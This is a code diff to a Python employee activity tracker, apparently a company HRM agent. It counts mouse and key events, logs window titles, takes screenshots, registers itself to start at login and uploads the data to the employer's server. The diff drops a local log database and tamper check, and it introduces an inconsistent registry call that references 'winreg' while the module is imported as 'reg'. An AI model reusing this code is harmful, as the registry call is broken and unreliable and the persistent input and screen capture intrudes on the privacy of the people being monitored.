@@ -3,7 +3,6 @@ import requests
 import json
 import os
 import sys
-import threading
 import tkinter as tk
 from tkinter import messagebox
 from pynput import mouse, keyboard
@@ -12,31 +11,21 @@ import ctypes
 import pyautogui
 import base64
 import io
-import sqlite3
 
-# --- PLATFORM SPECIFIC IMPORTS ---
 if sys.platform == "win32":
     import winreg as reg
 
 # ================= CONFIGURATION =================
 if sys.platform == "win32":
-    # Windows: C:\Users\<User>\AppData\Roaming\SoftexHRM
     BASE_DIR = os.path.join(os.environ["APPDATA"], "SoftexHRM")
 else:
-    # Linux: /home/<user>/.config/softex_hrm
     BASE_DIR = os.path.join(os.path.expanduser("~"), ".config", "softex_hrm")
 
 if not os.path.exists(BASE_DIR):
     os.makedirs(BASE_DIR, exist_ok=True)
 
 CONFIG_FILE = os.path.join(BASE_DIR, "sys_config.dat")
-DB_FILE = os.path.join(BASE_DIR, "sys_logs.db")
 SERVER_URL = "https://hrm.softexsolution.com"
-
-# Tamper Detection
-TAMPER_FLAG = False
-if os.path.exists(CONFIG_FILE) and not os.path.exists(DB_FILE):
-    TAMPER_FLAG = True
 
 # Global State
 employee_data = None
@@ -46,7 +35,6 @@ key_events = 0
 
 # ================= AUTO-STARTUP LOGIC =================
 def add_to_startup():
-    """Adds the script to startup (Registry for Windows, Autostart for Linux)."""
     if sys.platform == "win32":
         try:
             if getattr(sys, "frozen", False):
@@ -54,11 +42,11 @@ def add_to_startup():
             else:
                 file_path = os.path.abspath(__file__)
 
-            key = reg.HKEY_CURRENT_USER
+            key = winreg.HKEY_CURRENT_USER
             key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
-            reg.SetValueEx(open_key, "SoftexHRM", 0, reg.REG_SZ, file_path)
-            reg.CloseKey(open_key)
+            open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
+            winreg.SetValueEx(open_key, "SoftexHRM", 0, winreg.REG_SZ, file_path)
+            winreg.CloseKey(open_key)
         except Exception as e:
             print(f"Windows Startup Failed: {e}")
 
@@ -91,78 +79,6 @@ Comment=Employee Activity Tracker
             os.chmod(desktop_file, 0o755)
         except Exception as e:
             print(f"Linux Startup Failed: {e}")
-
-# ================= DATABASE ENGINE =================
-def init_db():
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute(
-            """CREATE TABLE IF NOT EXISTS activity_logs
-                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                      window_title TEXT,
-                      is_coding INTEGER,
-                      activity_score INTEGER,
-                      timestamp REAL,
-                      screenshot TEXT,
-                      is_tamper_alert INTEGER DEFAULT 0)"""
-        )
-
-        if TAMPER_FLAG:
-            c.execute(
-                "INSERT INTO activity_logs "
-                "(window_title, is_coding, activity_score, timestamp, is_tamper_alert) "
-                "VALUES (?, ?, ?, ?, ?)",
-                ("SYSTEM_SECURITY_EVENT: LOGS_DELETED", 0, 0, time.time(), 1),
-            )
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        print(f"DB Init Error: {e}")
-
-def save_log_local(window, is_coding, score, screenshot=None):
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute(
-            "INSERT INTO activity_logs "
-            "(window_title, is_coding, activity_score, timestamp, screenshot, is_tamper_alert) "
-            "VALUES (?, ?, ?, ?, ?, 0)",
-            (window, 1 if is_coding else 0, score, time.time(), screenshot),
-        )
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        print(f"Local Save Error: {e}")
-
-def get_unsent_logs():
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        conn.row_factory = sqlite3.Row
-        c = conn.cursor()
-        c.execute("SELECT * FROM activity_logs")
-        rows = c.fetchall()
-        conn.close()
-        return rows
-    except Exception as e:
-        print(f"Get logs error: {e}")
-        return []
-
-def clear_logs(log_ids):
-    if not log_ids:
-        return
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.executemany(
-            "DELETE FROM activity_logs WHERE id = ?",
-            [(i,) for i in log_ids],
-        )
-        print("Rows deleted from local DB:", c.rowcount)
-        conn.commit()
-        conn.close()
-    except Exception as e:
-        print(f"Clear Log Error: {e}")
 
 # ================= CONFIG MANAGERS =================
 def save_config(data):
@@ -212,7 +128,7 @@ def take_screenshot_base64():
         print("Screenshot error:", e)
         return None
 
-# ================= UI & MAIN LOOP =================
+# ================= UI =================
 def show_login():
     root = tk.Tk()
     root.title("Softex HRM Agent")
@@ -269,6 +185,7 @@ def show_login():
     ).pack(pady=20)
     root.mainloop()
 
+# ================= INPUT LISTENERS =================
 def start_listeners():
     def on_move(x, y):
         global mouse_events
@@ -289,13 +206,10 @@ def start_listeners():
     except Exception as e:
         print("Listener start error:", e)
 
+# ================= MAIN LOOP =================
 def main_loop():
     global is_tracking, mouse_events, key_events
-    init_db()
     start_listeners()
-
-    last_upload = time.time()
-    UPLOAD_INTERVAL = 300  # 5 min
 
     while True:
         try:
@@ -303,7 +217,7 @@ def main_loop():
             command = "STOP"
             should_ss = False
 
-            # STATUS CHECK
+            # 1. STATUS CHECK
             try:
                 res = requests.get(
                     f"{SERVER_URL}/api/tracker/status?employeeId={emp_id}",
@@ -327,46 +241,33 @@ def main_loop():
                 ss_data = take_screenshot_base64() if should_ss else None
                 total_acts = mouse_events + key_events
                 print("Activity:", total_acts, "Window:", win)
-                save_log_local(win, is_code, total_acts, ss_data)
+
+                # 2. SEND DIRECTLY TO BACKEND (single log)
+                log = {
+                    "windowTitle": win,
+                    "isCoding": bool(is_code),
+                    "activityScore": int(total_acts),
+                    "ss": ss_data,
+                    "tamperAlert": False,
+                    "createdAt": time.time(),  # seconds
+                }
+                try:
+                    r = requests.post(
+                        f"{SERVER_URL}/api/tracker/update",
+                        json={"employeeId": emp_id, "logs": [log]},
+                        timeout=30,
+                    )
+                    print("UPLOAD STATUS:", r.status_code, r.text)
+                except Exception as e:
+                    print("Upload error:", e)
+
+                # reset counters for next 5-second window
                 mouse_events = 0
                 key_events = 0
-
-                # UPLOAD
-                if time.time() - last_upload > UPLOAD_INTERVAL:
-                    logs = get_unsent_logs()
-                    print("Unsent logs count:", len(logs))
-                    if logs:
-                        payload = []
-                        ids = []
-                        for row in logs:
-                            payload.append(
-                                {
-                                    "windowTitle": row["window_title"],
-                                    "isCoding": bool(row["is_coding"]),
-                                    "activityScore": row["activity_score"],
-                                    "ss": row["screenshot"],
-                                    "tamperAlert": bool(row["is_tamper_alert"]),
-                                    "createdAt": row["timestamp"],  # seconds
-                                }
-                            )
-                            ids.append(row["id"])
-                        try:
-                            r = requests.post(
-                                f"{SERVER_URL}/api/tracker/update",
-                                json={"employeeId": emp_id, "logs": payload},
-                                timeout=60,
-                            )
-                            print("UPLOAD STATUS:", r.status_code, r.text)
-                            if r.status_code in (200, 201):
-                                clear_logs(ids)
-                                last_upload = time.time()
-                            else:
-                                print("Upload failed; logs kept locally")
-                        except Exception as e:
-                            print("Upload error:", e)
             else:
                 is_tracking = False
 
+            # keep running as long as machine is on
             time.sleep(5)
         except KeyboardInterrupt:
             break
